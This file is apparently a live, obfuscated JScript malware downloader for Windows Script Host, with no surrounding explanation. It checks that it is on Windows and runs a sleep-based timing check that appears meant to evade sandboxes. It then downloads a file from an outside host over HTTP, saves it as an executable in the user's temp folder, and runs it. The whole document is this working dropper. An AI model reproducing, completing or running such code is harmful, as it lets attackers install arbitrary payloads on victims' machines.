var _KF = false;
var _LJ = "CreateObject";
var _XF = function _NS() {return WScript[_LJ]("WScript"+".Shell");}(), _NU = 11;
var _U = "MSXML2.XMLHTTP";
var _IY = 2123213;
var _GT = 0;
function _Y(_FC){_XF["Run"](_FC, _GT, _GT);};
function _DX(){return _U + "";};
function _FY(_P, _K0){_GT = _GT * 1; return _P - _K0;};
function _NB(){return _LJ;};
/*@cc_on
  @if (@_win32 || @_win64)
    _KF = true;
  @end
@*/
if (_KF)
{
var _WU = "";
function _ES(){return 22;};
var _DF = 0; var _DZ = 0;
function _Z()
{
var _TX = new this["Date"]();
var _JK = _TX["getUTCMilliseconds"]();
WScript["Sleep"](_ES());
var _TX = new this["Date"]();
var _FH = _TX["getUTCMilliseconds"]();
WScript["Sleep"](_ES());
var _TX = new this["Date"]();
var _HG = _TX["getUTCMilliseconds"]();
var _DF = "_H";
_DF = _FY(_FH, _JK);
var _DZ = "_B";
_DZ = _FY(_HG, _FH);
_WU = "open";
return _FY(_DF, _DZ);
}
var _HB = false;
var _AM = false;
for (var _WW = _GT; _WW < _ES() * 1; _WW++){if (_Z() != _GT){
_HB = true; 
_DZ = "31" + 11 * _DF + _DZ; 
_AM = true; 
break;
}}
function _X() {return ((_HB == true) && (_HB == _AM)) ? 1 : _GT;};
if (_HB && _X() && _AM){
function _E() {return _XF["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "X1fhDCFNdjs8Y.ex" + "e";};
 _BS = _DX();
 _KF0 = WScript[_LJ](_BS);
 var _M = 1;
 while (_M){
try {
	if (_M == 1)
	{
		_KF0[_WU]("GET", "http://ihlasauracleanmax.co/j3dlad", false);
		_KF0["send"]();
		_RE = "Sleep";
	}
	WScript[_RE](_ES() + 120); 
	if (_KF0["readystate"] < 2 * 2) continue;
	_M = _GT;
	function _K(_BQ) {var _FX = (1, 2, 3, 4, 5, _BQ); return _FX;};
	_TM = WScript[_NB()]("ADODB.Stream");
	_BS = _TM;
	_BS[_WU]();
	_BS["type"] = _K(1);
	_BS["write"](_KF0["ResponseBody"]);
	_TM["position"] = _K(_GT);
	_BS["Save" + "ToFile"](_E(), 2);
	_TM["cl"+"ose"]();
	_RY = _E();
	_Y(_RY);
} catch(_B0){};
}
}
}

